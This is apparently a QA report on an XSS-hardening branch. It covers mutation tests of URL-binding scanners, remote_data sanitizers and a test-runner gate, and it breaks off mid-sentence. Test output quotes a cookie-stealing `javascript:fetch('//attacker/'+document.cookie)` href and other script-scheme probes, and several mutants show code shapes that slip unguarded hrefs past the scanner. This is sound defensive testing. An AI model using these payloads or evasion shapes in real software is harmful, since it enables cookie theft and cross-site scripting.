# test-xss-r3 — QA report

**Leg:** test engineering. **Tree:** `git rev-parse HEAD` = `6805daa32aa67992bb26a4e66bd9d102bbf6fa53` [MEASURED] — matches §1.
**Branch:** `url-scheme-validation-r2`. **Range measured:** `0bc9b72..6805daa`, 6 commits, 14 files, +2098/−173 [MEASURED, `git diff --stat`].

---

## §0 — OPEN PASS (written before reading my own item list)

### Contamination disclosure

I read `_xss-r3-baseline-block.md` in full first, as instructed, and did this pass
before opening `test-xss-r3.md`. **One item leaked to me anyway:** the routing
message from the EM named item **T5** ("a sample-size-backed bound on the
TestWatchTasks flake") in plain text. So T5 is not an open-pass finding — I knew
about it. Everything else below was found without sight of the item list. I also
read the fix leg's report? **No** — I have not opened `dev-xss-r3.md` at all, at
any point.

I also want to be explicit about one thing that shaped this pass: I did **not**
start from `href`. I started by asking what leaves the server, enumerated every
`RemoteData` writer and every DOM sink independently, and only then looked at the
guards. That ordering is what produced O-1, O-2 and O-9, none of which are
reachable from a grep for the thing the diff changed.

### The one-sentence answer to "what does this diff put at risk?"

The diff is good work — most of what it claims is true and I could not break the
central property. The risk it introduces is **not** in the guards; it is that the
diff ships **three new meta-oracles** (a URL-binding scanner, an adapter-key
source scanner, and a test-runner consumption gate) which are now the *only*
thing standing behind large parts of the property, and **two of the three have
measured fail-opens of exactly the class this round was convened to eliminate.**
The round's signature failure mode — "a declared constraint that nothing
invokes, with a green suite" — has been closed in the places it was found and
reproduced in the places the fix added.

### Findings

Severity is my judgement. Reachability is stated separately from mechanism,
because for most of these the mechanism is broken *now* and the reachability is
*latent*.

---

#### O-1 — `sanitizeRemoteData` is shallow; a nested URL carrier reaches the wire unvalidated [MEASURED] — attribution: OPEN PASS

`sanitizeRemoteData` (`internal/server/urlvalidate.go:195-213`) iterates only the
top level of the map. `convert.go:358` then serialises the whole thing.

```
go test ./internal/server/ -run TestProbe_SanitizeIsShallow -v
  NESTED parent.html_url survived sanitizeRemoteData = javascript:alert(1)
  ON THE WIRE remote_data.parent.html_url      = "javascript:alert(1)"
  ON THE WIRE remote_data.sub_issues[0].url    = "javascript:alert(1)"
```

**This is a known-and-documented limitation, not a surprise** — and the diff
handles it better than most: `TestRemoteDataKeysWrittenByAdaptersAreClassified`
(`urlvalidate_differential_test.go:519-528`) has an explicit loop asserting that
no *nested* adapter key is URL-bearing, with the right failure text. Credit where
due. **But that loop only covers in-tree adapters.** The import path
(`validateImportedTaskURLs`, `urlvalidate.go:226-243`) also walks only the top
level, and `ImportCollection` copies caller-supplied `remote_data` verbatim
(`export_import.go:438,743` → `entstore.go:2189`). So a caller-uploaded
collection carrying `remote_data: {"parent": {"html_url": "javascript:…"}}` is
accepted at the write boundary *and* passed through the read boundary.

**Reachability to a sink: none today** — see O-9. Severity **Medium** on that
basis; it would be High if any component read `remoteData`.

**And note the nested loop's own blind spot, measured under O-7:** it cannot see
a nested literal written as `map[string]interface{}{` or on one line, so it does
not actually enforce what its failure message says it enforces.

---

#### O-2 — `collectionToProto` does not sanitize, and nothing validates a collection's `remote_data` on either boundary [MEASURED] — attribution: OPEN PASS

The diff sanitized `taskToProto` and left the identical construct one function
away untouched.

```go
// convert.go:358  (task)       — sanitized by this diff
pt.RemoteData, _ = structpb.NewStruct(sanitizeRemoteData(t.RemoteData))
// convert.go:530  (collection) — NOT sanitized
pc.RemoteData, _ = structpb.NewStruct(c.RemoteData)
```

`validateImportedTaskURLs` takes an `exportTask` and is called once, at
`export_import.go:722`, per task. `doc.Collection.RemoteData`
(`export_import.go:332`) is never validated by anything.

```
go test ./internal/server/ -run TestProbe_CollectionRemoteDataIsNotSanitized -v
  ON THE WIRE collection.remote_data["html_url"]   = "javascript:alert(1)"
  ON THE WIRE collection.remote_data["remote_url"] = "javascript:alert(1)"
```

This is the precise mirror image of the task-side gap that commit `54c46cc`
exists to close, still open, one function below the fix. It is also the *only*
remaining carrier that is unguarded on **both** boundaries rather than one.

**Reachability to a sink: none today** — `capabilities.ts:98-101` and
`ft-app.ts:256-259` read `collection.remoteData` for a `writable` boolean and
nothing else. Severity **Medium**.

**Recommended test (does not exist):** `TestCollectionToProtoScrubsRemoteDataURLCarriers`,
mirroring `TestTaskToProtoScrubsRemoteDataURLCarriers` verbatim. Its absence is
why the asymmetry survived a round that was specifically looking for URL
carriers.

---

#### O-3 — CRITICAL FOR THIS ROUND: the URL-binding scanner approves a guard defeated by reassignment. Third instance of the D1 defect class. [MEASURED] — attribution: OPEN PASS

`url-binding-scan.test.ts:792-801` decides a `viaSafeHref` allow-list entry with:

```ts
block.some((l) => assignsFromSafeHref(l, id!))
```

`assignsFromSafeHref` was hardened in `42d62a4` so the *initialiser expression*
cannot reinstate the raw value (`safeHref(url) || url` now fails). But `.some()`
asks only whether **one** line in the block is a good assignment. It says nothing
about the **other** assignments to the same identifier.

**Mutant M1** — in the real `ft-inspector-meta.ts::renderExternalSourceLink`:

```diff
-  const href = safeHref(remoteUrl);
-  if (href === undefined) {
+  let href = safeHref(remoteUrl);
+  href = remoteUrl;
+  if (false as boolean) {
```

Result — **assert which arm fired**, per §3:

| oracle | verdict |
|---|---|
| `url-binding-scan.test.ts` | **`url-binding-scan: ok`** — GREEN on a fully defeated guard |
| `safe-url.test.ts` | RED: `a javascript: URL must not produce an anchor at all, got: <a target="_blank" rel="noopener" class="external-source-link" href="javascript:fetch('//attacker/'+document.cookie)">` |
| suite | exit 1 |

So the suite catches M1 — but **only** because `safe-url.test.ts` imports these
two specific functions. The scanner is the chokepoint for *everything else*.

**Mutant M1b — the decisive experiment.** A new component
(`components/ft-probe-widget.ts`) with the same defeated shape, allow-listed with
`viaSafeHref: true`, in a file `safe-url.test.ts` does not import:

```ts
export function renderProbeLink(url: string) {
  let href = safeHref(url);
  href = url;
  return html`<a href=${href} target="_blank" rel="noopener" class="probe-link">probe</a>`;
}
```

```
$ npm test
url-binding-scan: ok
PASS: 4 test file(s), 320 assertions.
EXIT 0
```

**The entire web suite is green on a live, unguarded, attacker-controlled href.**

This is the same defect the r3 round already found twice — D1(a) at the
expression level, D1(b) at the block-scope level — surviving at the **statement**
level. The docblock at `url-binding-scan.test.ts:222-231` lists "three
successively tighter versions"; this is a fourth that was not taken.

**Severity: High** (as a test-integrity defect; it is not itself a live XSS).
**Recommended fix direction (developer's call, not mine):** require that *every*
assignment to `id` in the block satisfies `assignsFromSafeHref`, i.e. replace
`.some(good)` with `!.some(isAssignmentTo(id) && !good)` — and add the
reassignment shape to the `notGuarded` fixture table at
`url-binding-scan.test.ts:619-633`, which currently has ten entries and no
multi-statement case. Every fixture in that table is a single line, which is why
the hole is invisible from inside it.

---

#### O-4 — Scanner recall: `window.location = X` is undetected and is not on the declared blind-spot list [MEASURED] — attribution: OPEN PASS

The scanner's docblock (`url-binding-scan.test.ts:16-20`) puts its boundary "on
the record": CSS `url()`, `unsafeStatic`/`unsafeHTML`, attribute spread, and
`el.data` on `<object>`. I probed 17 candidate sinks through the real tree scan
(a throwaway `src/util/zz-probe-sinks.ts`, since removed). **3 of 17 fired.**

| probe | detected? | notes |
|---|---|---|
| `el.setAttribute('HREF', raw)` | **yes** | case-insensitivity works |
| `html\`<a\n href=${raw}>\`` | **yes** | newline before binding |
| `html\`<a href=${ raw }>\`` | **yes** | spaces inside `${}` |
| **`window.location = raw`** | **NO** | **navigates; `javascript:` executes. Not on the blind-spot list.** |
| **`document.location = raw`** | **NO** | same |
| **`<meta http-equiv="refresh" content=${raw}>`** | **NO** | navigates. Not on the list. |
| `el.outerHTML = raw` | NO | not on the list |
| `el.innerHTML = raw` | NO | not on the list |
| `el.insertAdjacentHTML(...)` | NO | not on the list |
| `el.style.background = 'url(' + raw + ')'` | NO | **declared** blind spot — honest |
| `<blockquote cite=${raw}>`, `<body background=${raw}>` | NO | low severity |
| `sendBeacon`, `pushState`, `fetch`, `new Worker`, `import()` | NO | not scheme-escalation for `javascript:` |

The `location`-assignment miss is a near-miss of the scanner's *own* rule: the
`imperative navigation` pattern (`url-binding-scan.test.ts:146-149`) covers
`location.assign`, `location.replace` and `window.open`, but not the plain
assignment form, which is the most common way it is written.

**Reachability: zero occurrences of any of these in the tree today** (verified by
independent sweep of all 58 files in `web/src`). This is a **recall gap in a
chokepoint**, not a live defect. **Severity: Medium** — the whole point of a
chokepoint is the binding nobody has written yet.

Green control worth reporting at equal weight: the diff's recall *widening* in
`457886d` is real. Quoted bindings, `setAttribute`, `setAttributeNS`, computed
attribute names, `srcdoc`/`formaction`/`action`/`ping`/`srcset`/`poster`/`data`,
uppercase attributes, `href.baseVal`, and the multi-line `Object.assign` shape
all fire, each with a positive fixture. That is a substantial and well-tested
improvement and I could not find a false negative among the shapes it claims.

---

#### O-5 — The shared fixture corpus has no dangerous-input floor: a count-neutral corruption removing every script-scheme fixture is green on both halves [MEASURED] — attribution: OPEN PASS

This is the §3 count-neutral bar applied to the fixture file itself.

I rewrote all 6 fixtures whose input begins with `javascript:`/`data:`/`vbscript:`/
`blob:`/`file:` into benign `https://example.com/neutered<N>` URLs and set their
columns to `accept/accept` to match. **Every count the tests could react to is
held exactly fixed:**

| | baseline | corrupted |
|---|---|---|
| cases | 42 | **42** |
| agreeing | 33 | **33** |
| divergent | 9 | **9** |
| `base_dependent` | 6 | **6** |
| npm assertion receipt | 315 | **315** |

Result:

```
go test ./internal/server/ -run 'SharedFixtures|ValidateURLField|DivergenceNote'  -> ok, exit 0
npm test  -> PASS: 4 test file(s), 315 assertions.  exit 0
```

Both differential halves are green with **zero** script-bearing inputs left in
the shared corpus. The anti-vacuity controls that exist (`divergent > 0`,
`agreeing > 0`, `cases.length > 0`, `marked > 0`) are all count-shaped and none
is sensitive to the *hazard class* of the inputs.

**Which arm actually holds the property** (§3, overlapping arms): **not the
shared corpus.** It is `safe-url.test.ts::testRejectsUnsafeSchemes` (27
hard-coded rejections) and Go's `TestPassthroughReadDropsUnsafeRemoteURL`
(6-row table with an explicit `len(unsafe) == 0` vacuity guard). Those two
masked the corruption. The fixture file's job is the *differential*, and it does
that job; my finding is that the prose around it (`safe-url.ts:36-40`,
`urlvalidate_differential_test.go:83-87`) invites the reader to treat it as the
scheme-safety corpus, which it is not and has no control making it so.

**Severity: Low-Medium.** **Recommended test:** a one-line floor in
`loadURLSchemeCases` / `loadSchemeCases` asserting that ≥N fixtures carry a
non-http(s) scheme and are `reject`/`reject` on both columns.

---

#### O-6 — `run-tests.mjs` does not detect a test file outside `src/`, and its docblock says it is bounded [MEASURED] — attribution: OPEN PASS

`run-tests.mjs:39-43` states:

> *"What this does not cover: a test file outside src/ entirely. That is bounded
> by requireTestConfigGlob(), which pins tsconfig.test.json's include to
> `src/**/*.test.ts` — so 'only src/ is compiled' is a checked fact rather than
> an assumption."*

The premise is true and the conclusion does not follow. Pinning the *include*
tells you what **is** compiled; it cannot tell you a test file exists somewhere
else. Measured — `web/test/orphan.test.ts` containing nothing but
`throw new Error('THIS TEST FILE SHOULD HAVE FAILED THE SUITE');`:

```
$ npm test
Discovered 4 test file(s).
PASS: 4 test file(s), 315 assertions.
EXIT 0
```

Silently unrun. This is a **true-measurement / false-sentence** pair inside the
commit (`d92ae5e`) whose stated purpose was to remove exactly that pattern, and
it is the same silent-skip class the runner was written to close. **Severity:
Low** (no such file exists today; `web/` has no test dir). Fix is one line:
run `requireCanonicalTestNames` over `webRoot` minus `node_modules`/`dist`/
`.tmp-test`, not over `srcDir`.

**Green control, reported at equal weight:** the *consumption* gate is genuinely
non-vacuous. Stubbing the counter in `assertions.ts` (`count += 1` → no-op):

```
FAIL: 3 of 4 test file(s) failed:
  src/util/safe-url.test.ts (exited 0 having evaluated 0 assertions: it ran, and it checked nothing)
  src/util/url-binding-scan.test.ts (exited 0 having evaluated 0 assertions: it ran, and it checked nothing)
EXIT 1
```

Fires with the intended message. The naming chokepoint also works within `src/`.
This part of `d92ae5e` does what it says.

---

#### O-7 — `remoteDataLiteralKeysIn` has three measured recall/attribution defects, one of which produces the exact false verdict the nesting split exists to prevent [MEASURED] — attribution: OPEN PASS

The adapter-key scanner is a hand-rolled line matcher. I exercised it directly
(`TestProbe_KeyScannerRecall`) rather than by mutating an adapter:

| source shape | `top` | `nested` | verdict |
|---|---|---|---|
| baseline `map[string]any{` multi-line | `[remote_url parent]` | `[html_url]` | correct |
| **nested literal typed `map[string]interface{}{`** | `[remote_url parent html_url]` | `[]` | **`html_url` misattributed as TOP-LEVEL** |
| **nested literal on ONE line** | `[remote_url parent]` | `[]` | **`html_url` invisible entirely** |
| **builder under a different name** | `[]` | `[]` | **silently zero keys** |

Row 2 is the serious one. `map[string]interface{}` is the *identical Go type* to
`map[string]any` — and it is what `ent` actually generates
(`internal/store/ent/task.go:60`). Under that spelling, a nested `html_url` is
classified TOP-level, `urlBearingRemoteDataKey` returns true, and the test logs:

> `remote_data["html_url"]: URL-bearing, validated on both boundaries`

which is **false** — `sanitizeRemoteData` never walks it. The docblock at
`urlvalidate_differential_test.go:716-720` says the split is load-bearing
precisely so that "a nested key [cannot] inherit a top-level key's 'validated on
both boundaries' verdict, which is exactly the kind of
true-measurement-false-sentence this round exists to remove." Measured: it can.

Row 4 matters because `remoteDataBuilderFuncs` is a two-name literal list and
`adapters` is a three-file literal list. `internal/server/server.go:661-669`
writes `remote_id` and `remote_url` into a RemoteData map and is not scanned.
The anti-drift here is partial-but-real and deserves credit: the *reverse*
check at lines 531-538 (a stale `nonURLKeys` entry fails) would catch a beads
builder that stopped matching, because 9 beads-only keys would go unclaimed.
It would **not** catch a *new* adapter never added to the list.

This means the claim in `urlvalidate.go:104-107` — "the set of keys the in-tree
platform adapters write IS finite, and every one of them must be either
URL-bearing … or listed there" — is an overstatement. The enforced set is
**the keys matched by two textual shapes inside two named functions in three
named files.** **State whether your enumeration is a bound or a count** (§3):
this is a **lower bound**, presented as a set.

**Severity: Medium** (test-integrity). **Recommended fix direction:** parse with
`go/ast` instead of line matching, or at minimum match
`map[string](any|interface\{\})\{` and add the three shapes above as negative
fixtures — there are currently no unit fixtures for `remoteDataLiteralKeysIn`
at all, only the two positive controls inside the caller.

---

#### O-8 — `urlBearingRemoteDataKey` classifies `HTMLURL` but not `htmlurl` [MEASURED] — attribution: OPEN PASS

The predicate has a documented all-caps suffix fallback. There is no equivalent
for an all-lowercase concatenated run.

```
urlBearingRemoteDataKey("HTMLURL")   = true    segments=["HTMLURL"]
urlBearingRemoteDataKey("html_url")  = true    segments=["html" "url"]
urlBearingRemoteDataKey("htmlUrl")   = true    segments=["html" "Url"]
urlBearingRemoteDataKey("htmlurl")   = FALSE   segments=["htmlurl"]
urlBearingRemoteDataKey("issueurl")  = FALSE   urlBearingRemoteDataKey("remoteurl") = FALSE
urlBearingRemoteDataKey("weburi")    = FALSE   urlBearingRemoteDataKey("pagelink")  = FALSE
urlBearingRemoteDataKey("url_2")     = true    urlBearingRemoteDataKey("url2")      = FALSE
```

Also unclassified, and these are ordinary URL key names: `website`, `homepage`,
`webhook`, `callback`, `redirect`, `endpoint`, `source`, `location`,
`attachment`, `avatar`, `image`, `icon`, `site`.

For **in-tree adapters** this is contained: an adapter writing `htmlurl` would be
neither URL-bearing nor in `nonURLKeys`, so
`TestRemoteDataKeysWrittenByAdaptersAreClassified` errors. That is a good design
and it works. For the **import path** there is no such containment — an uploaded
collection can use any key, and `htmlurl` passes `validateImportedTaskURLs`
untouched. Combined with O-1/O-2 this is the same latent surface.

`TestURLBearingRemoteDataKeyClassification` (lines 683-699) tests 11 positives
and 10 negatives; `htmlurl` and the `url2` asymmetry are in neither list. The
fail-closed *direction* claimed in the docblock ("anything whose key looks like
it holds a URL is treated as holding one") is accurate for separated and
camelCase keys and inaccurate for concatenated lowercase ones. **Severity: Low**
given O-9. **Recommended test:** add the concatenated-lowercase row to the
`notURLBearing`/`urlBearing` tables with an explicit decision recorded, so the
asymmetry is a choice on the record rather than an accident.

---

#### O-9 — The finding that reframes the whole `remote_data` track: `Task.remoteData` is never read anywhere in `web/src` [MEASURED, independent full-tree sweep] — attribution: OPEN PASS

`pb.Task.remote_data` is *populated* into the client model
(`web/src/gen/grpc-client.ts:459`, typed `gen/types.ts:252`) and **read by
nothing**. No component, no store, no template. `Collection.remoteData` is read
in exactly two places (`capabilities.ts:98-101`, `ft-app.ts:256-259`) and only
for a `writable` boolean.

Consequences I want on the record, because they cut in both directions:

1. **Downgrade.** O-1, O-2 and O-8 are *not* live XSS. Nothing renders these
   values. I have marked them Medium/Low on that basis rather than High.
2. **Upgrade of a different thing.** The commit message for `54c46cc` and the
   comment at `convert.go:341-350` describe the `remote_data` re-emission as the
   value riding "out to the client anyway". True — it reaches the client. It does
   not reach a sink. The fix is correct and worth having as depth, but the
   *severity framing* around it is one step stronger than the tree supports, and
   nothing in the diff says so.
3. **The load-bearing consequence for testing.** Because there is no sink, an
   end-to-end pin on this path is *structurally impossible* — which is the Mode-1
   trap named in §5. The diff already recognised this for the passthrough path
   and handled it exemplarily (see the green control below). It has **not**
   recognised it for the ent-stored/import path, where the same absence of a sink
   means `TestTaskToProtoScrubsRemoteDataURLCarriers` is the strongest pin
   obtainable, and it is a wire-level pin, not a render-level one. That is fine —
   but it should be stated, because the next reader will otherwise assume
   `safe-url.test.ts` covers it. It does not; it covers `remoteUrl` and `pr.url`.

**Green control, at equal weight — and this is the best single paragraph in the
diff.** `passthrough_url_test.go:199-224` does *not* assert "remote_url is absent
from remote_data" on the passthrough path. It explains that such an assertion
would be vacuous (because `issueBuildRemoteData` writes a `[]string` and
`structpb.NewStruct` rejects the whole map), asserts the *guard condition*
instead (`len(fields) != 0` is an error), and tells the future maintainer exactly
what to do when the guard breaks. I verified the mechanism independently:

```
TestProbe_StructpbRejectionIsWholeMap:
  NewStruct{remote_id:"kept?", labels:[]string{"bug"}} -> struct=<nil> err=proto: invalid type: []string
```

I also confirmed a *second*, independent rejecting value the diff does not
mention: `sub_issues` is `[]map[string]any` (`graphql_queries.go:510`), which
`structpb` also rejects. So `remote_data` on the passthrough path is nil for two
reasons, not one — the pin in `TestGitHubPassthroughRemoteDataNeverSerialises`
checks only the `labels`/`[]string` reason, and would go green-and-wrong if only
that one were fixed. Minor, but it is the same "state the whole causal set"
issue as §5 Mode 2.

---

#### O-10 — Scope-boundary observation: the two sinks with the widest scheme policy are the two with no test at all — attribution: OPEN PASS

§6 fences off the `#195` markdown/DOMPurify work and I am not re-deriving it.
What I am surfacing is a statement *this diff makes about itself*.

`url-binding-scan.test.ts:1-11` presents itself as the tree-wide chokepoint:
"the fix has to be a chokepoint: this scanner fails the build for any dynamic
binding of a URL-bearing attribute". The tree has exactly **4** URL-attribute
sinks and all 4 are guarded. It also has **2** HTML sinks —
`ft-inspector-desc.ts:233` and `ft-inspector-comments.ts:221`, both
`unsafeHTML(renderMarkdown(...))` over `task.description` / `comment.body`.
`markdown.ts` is 6 lines: `DOMPurify.sanitize(marked.parse(md))` with **no
config**. DOMPurify's default `href` policy permits `ftp:`, `mailto:`, `tel:`,
`callto:`, `sms:`, `cid:`, `xmpp:`, `matrix:`, all relative and **all
protocol-relative** URLs.

So `//evil.com/login` — an input `safe-url.ts:57` names explicitly as a rejection
and the reason the no-base parse exists — renders as a live off-origin anchor
from a task description, at the same trust level, from the same server, in the
same inspector panel. It is not XSS (DOMPurify blocks `javascript:`/`data:` on
anchors, strips `on*`, and drops `<script>`/`<iframe>`).

The scanner's own scope note (lines 22-28) says the companion rule belongs in
`web/src/util/markdown.test.ts`, which "does not exist at this commit". I
confirmed: no such file, zero occurrences of `BANNED_SINKS`. **So the four
tightly-guarded sinks carry a dedicated scanner plus JSDOM behavioural pins, and
the two loosely-guarded sinks carry nothing.** I am not asking this branch to fix
DOMPurify. I am flagging that "chokepoint" overstates the coverage by exactly the
sinks that most need it, and that the fence means no leg is currently measuring
the gap. **Escalation recommendation to the manager, not a change request on
this branch.**

---

#### O-11 — the `TestWatchTasks` flake is a *family* of five tests hitting a hard 5.0s deadline, not one test [MEASURED, run in progress] — attribution: BOTH (T5 leaked to me in the routing message; the *shape* below is open-pass)

Full numbers in §T5 below. The open-pass point: the baseline calls it
"`TestWatchTasks` … roughly 8% per sequential full-suite run", i.e. one test. In
82 runs so far I have six failures across **five distinct test names**
(`TestWatchTasks_NoInitial`, `_CreatedEvent`, `_ClaimEvent`, `_Heartbeat`,
`_UpdatedEvent`), each failing at **5.00–5.01s** — a fixed deadline, not jitter.
That changes what the recommended mitigation is, and it means the fix leg's
`-run TestWatchTasks -count=5` evidence is weaker than it looks: at ~7% per run
that experiment had roughly a 70% chance of passing even if nothing were fixed.

---

### Did the open pass find anything the item list would have missed?

I will answer this properly in §5 once I have read the item list. Recording now,
before I read it, what I would predict: **O-2 (collection carrier) and O-9
(`remoteData` has no reader) are the two I expect were not asked for**, because
both required looking outside the files the diff touches. O-3 I expect *was*
asked for in some form, since the brief mentions the scanner fixes. This
prediction is written down before reading so it can be scored.

---

## §1 — Gates [MEASURED, this session, repository root, no pipes on any exit code read]

| gate | exit | detail |
|---|---|---|
| `go build ./...` | **0** | zero bytes of output |
| `go vet ./...` | **1** | exactly 4 `copies lock value`, `internal/server/server.go:1509,1619,1827,2004`. Literal `copylock` 0×. `web/dist` 0× in build and vet output. |
| `go test ./...` | **0** | 0 `FAIL` lines |
| `npm test` (web/) | **0** | `PASS: 4 test file(s), 315 assertions.` |
| `web/dist` present | yes | 4109 files. Provisioning is intact; the §2 quiet trap did not fire. |

All five rows of the baseline §2 table **REPRODUCED** [MEASURED]. Re-measured after
every mutant was reverted; identical.

### Two of my own errors, caught and discarded rather than reported

Recorded because §2 says a control that catches your own error is a result.

1. I ran `git ls-tree -r 0bc9b72 -- web/src` from `web/` (the tool's cwd persists
   across calls), so the pathspec resolved to `web/web/src` and returned empty. I
   nearly recorded "no test files existed at 0bc9b72." Discarded and re-run from
   the repository root.
2. I read one mutant's exit code through a pipe (`npm test 2>&1 | tail`), which
   reports `tail`'s status. That run's verdict happened to be legible from the
   PASS line, but the exit code was junk. Every subsequent gate was run as
   `npm test > file 2>&1; echo $?`. This is the exact error §2 says two legs have
   already made on this project.
3. One MT1-5 run returned `EXIT=254` — `npm` could not find `/workspace/package.json`
   because my cwd had drifted to the repository root. Discarded and re-run.

---

## §2 — Mutation table

Every row run in this tree this session. `count held FIXED` states what the
mutant deliberately did not move, per §3's count-neutral bar. **SURVIVED = the
instrument could not see it.**

| id | item | mutant | count(s) held FIXED | result |
|---|---|---|---|---|
| M1 | OPEN | `ft-inspector-meta`: `let href = safeHref(u); href = u;` | — | **KILLED** by `safe-url.test.ts` only; scanner printed `url-binding-scan: ok` |
| M1b | OPEN | same shape in a NEW component, allow-listed `viaSafeHref: true` | — | **SURVIVED** — `PASS: 4 files, 320 assertions`, exit 0, live `javascript:` href |
| M2 | OPEN | 6 script-scheme fixtures neutered to benign https | 42 cases / 33 agree / 9 diverge / 6 base_dependent / **315 assertions** | **SURVIVED** both halves |
| M3 | OPEN | `web/test/orphan.test.ts` throwing unconditionally | 4 files / 315 | **SURVIVED** — never discovered, never run |
| M5 | OPEN | `assertions.ts`: `count += 1` → no-op | — | **KILLED**, 3 of 4 files, exact intended message |
| MT1-1 | T1 | `assertEqual` uses `!=` instead of `!==` | **315** | **SURVIVED** |
| MT1-2 | T1 | `emitReceipt` writes `count + 1000` | internal counter untouched | **SURVIVED** — `PASS: 4 files, 4315 assertions`, exit 0 |
| MT1-3 | T1 | `count += 1` moved AFTER the throw | — | **KILLED** — *"a failing assertion must still be counted"* |
| MT1-5 | T1 | `must()` body replaced with `void condition;` | **315, and 9 in the harness's own file** | **SURVIVED** — perfectly count-neutral |
| MT1-6 | T1 | counter frozen once it exceeds 20 (`if (count < 20) count += 1`) | monotonicity inside `assertions.test.ts` (its own count is 9, never reaches 20) | **SURVIVED** — 315 → **59**, exit 0 |
| MT2-1 | T2 | `javascript:` added to `SAFE_SCHEMES` | — | **KILLED** — by the *rejection table*, which runs first and **masks** the backstop |
| MT2-1b | T2 | `tel:` added (a non-special scheme with **no** fixture) | — | **KILLED** — by `testHostGuardIsAFailClosedBackstop`, arm isolated, exact message |
| MT3-1 | T3 | new test file emitting `#assertions 47` via `writeSync`, **no harness import**, zero checks | — | **SURVIVED** — `PASS: 5 test file(s), 362 assertions`, exit 0 |
| MT3-2a | T3 | scanner walk silently skips `store/`, `gen/`, `kanban/` (11 of 52 files). **No padding.** | **315**; `MIN_FILES` 41 ≥ 40; **3 of 3 witnesses still reached** | **SURVIVED** |
| MT3-2b | T3 | MT3-2a **plus** an unguarded `href=${raw}` planted in `store/` | **315** | **SURVIVED** — blind spot is exploitable |
| MT3-2c | T3 | control: walk restored, planted sink kept | — | **KILLED** — names `store/zz-probe-store-sink.ts:6` and the rule |
| MT6 | T6 | 14 near-miss binding shapes in one probe module | — | **2 detected, 12 missed** (table in §T6) |

Mutants I designed but did **not** run, so no claim is made about them: `assert`
throwing a bare string rather than an `Error`; `assertEqual` comparing
`String(a) === String(b)`; `assert` testing `condition === false`.

---

## §3 — Verdicts on T1–T7

### T1 — `assertions.test.ts` and `must()` — **PARTLY SOUND. Two survivors.**

**`must()` is genuinely outside the counted path** — confirmed, not merely named
differently: MT1-5 neutered it and the harness's own receipt stayed at **9**, and
the suite total stayed at **315**. The fix leg's reasoning is right.

**But being outside is exactly why nothing guards it.** MT1-5 is a perfectly
count-neutral mutant that disables *every check on the instrument* and moves no
number anywhere. The regress the leg identified — "you cannot check the
instrument through itself" — was taken one level and then stopped. The new
outermost level has no check, and unlike the counted path there is no count that
would move if it broke. I am **not** asking for `must.test.ts`; that regress does
not terminate. The realistic ask is that `must` be trivial enough to verify by
reading — which it is — and that this be *said*, since the docblock currently
presents the arrangement as closing the hole rather than relocating it.

**A mutant that survives all six checks: MT1-1.** `assertEqual` with `!=` instead
of `!==` survives every one of them (`1 !== 2` still throws; `'a'`/`'a'` and
`true`/`true` still pass; count advances; receipt stable) and survives the whole
suite at exactly **315**. `assertEqual` is called with mixed types across the
suite and its identity semantics are pinned only for pairs where `==` and `===`
agree.

**Monotonicity: within a file — and worse, within *one* file.** The brief asks
which. The counter is module state in a per-file process, so the check is
per-process, and only `assertions.test.ts` performs it. MT1-6 exploits both
facts: freeze the counter above 20, and the harness's own file (whose total is 9)
never reaches the frozen region, so its monotonicity check passes, while
`safe-url.test.ts` silently drops **204 → 20** and `url-binding-scan.test.ts`
**92 → 20**. Suite: `PASS: 4 test file(s), 59 assertions.` exit 0. **81% of the
suite's assertions stopped being counted and every instrument was satisfied.**

So the brief's summary of M-B2-8 — *"froze the counter at a plausible non-zero
constant and was killed by the monotonicity check"* — is true only for a constant
**below** the harness file's own count. Above it the same mutant survives.

**Third survivor, MT1-2:** the receipt is a self-report that nothing reconciles
against `assertionCount()`. Inflating it by 1000 per file gives
`PASS: 4 test file(s), 4315 assertions.` exit 0.

**The common root of all three: the suite total is never pinned.** 59, 315, 362
and 4315 are all "green". A single `assert(total === 315)` — reviewed when it
moves — would have killed MT1-2, MT1-6 and MT3-1 outright.

### T2 — **M-B6-5 is genuinely equivalent. I could not kill it. The `CURL` claim holds.**

Reachability argument, written out as requested:

1. `safeHref` reaches the guard only when `parsed.protocol ∈ SAFE_SCHEMES`.
2. Both members are WHATWG **special** schemes.
3. For a special scheme the URL parser treats host-parse failure as a **hard**
   failure, so `new URL()` throws instead of yielding an empty host.
4. Therefore no string reaching line 151 can have `hostname === ''`.

Measured against that argument, not just asserted: **216 candidate inputs**
(4 scheme spellings × 54 authority shapes: bare `://`, empty authority,
userinfo-only, port-only, dot hosts, bracket forms, IDN/`xn--` stubs,
percent-encodings, zero-width and invisible characters, backslashes) →
68 parsed, 148 threw, **0 reached an empty host with an http/https protocol**.
Positive controls in the same probe confirm the probe *can* observe an empty host
(`file:///etc/passwd` → `''`, `javascript:alert(1)` → `''`), so the zero is a
measurement and not a broken probe. [MEASURED, node v20.20.2]

I therefore **agree with the leg**, and I want to note the handling as the best
pattern in the diff: it did not delete unpinnable code, and it did not pretend to
pin it. It pinned the *reachability precondition* instead. MT2-1b confirms that
pin fires, with its exact intended message, the moment a non-special scheme is
allow-listed.

**An arm-masking note the leg does not make.** MT2-1 (`javascript:`) is killed by
`testRejectsUnsafeSchemes`, not by the backstop test — the rejection table runs
first and the file aborts on first throw. Anyone reading a `javascript:` mutant
result would credit the wrong arm. I had to use `tel:` — non-special, no fixture —
to isolate it. §3's "assert which arm fired" earns its place here.

**`CURL` fails closed — verified, not assumed** [MEASURED]:

```
urlBearingRemoteDataKey("CURL") = true    segments=["CURL"]
sanitizeRemoteData kept CURL?   false     (survivors: map[remote_id:acme/widgets#1])
validateURLField("CURL", "curl -X GET https://api.example.com")
  = InvalidArgument: invalid CURL: URL must not contain whitespace or control characters
```

Two refinements. (a) The false positive is **capitalisation-specific**:
`CURL`→true and `cURL`→true, but `curl`→false and `Curl`→false. "CURL is a false
positive" is true of one spelling of four. (b) The two boundaries disagree on what
fail-closed *means*: import **errors** (a hard 400), read **silently drops**. Both
are safe; they are not the same behaviour, and only the read path is documented as
a drop. Harmless today — nothing writes `CURL`.

### T3 — count-neutral corruptions **the leg did not run: three survivors.**

- **`sanitizeRemoteData` on nested maps — reachable, and it survives.** Covered as
  O-1/O-2 in §0. Nesting is reachable through `ImportCollection`, which copies
  caller-supplied `remote_data` verbatim.
- **The witness-path check — the brief's guess was right, and the real gap is
  wider than the brief supposes.** MT3-2a skips three whole directories, 11 of 52
  files, **with no padding at all**: the walk returns 41, `MIN_FILES` is 40, and
  all three witnesses (`components/inspector/…`, `components/dependency/…`,
  `util/safe-url.ts`) are in directories that were *not* skipped. Assertion count
  unchanged at 315. MT3-2b then plants a real unguarded `href=${raw}` in the
  skipped `store/` and the suite is still green; MT3-2c restores only the walk and
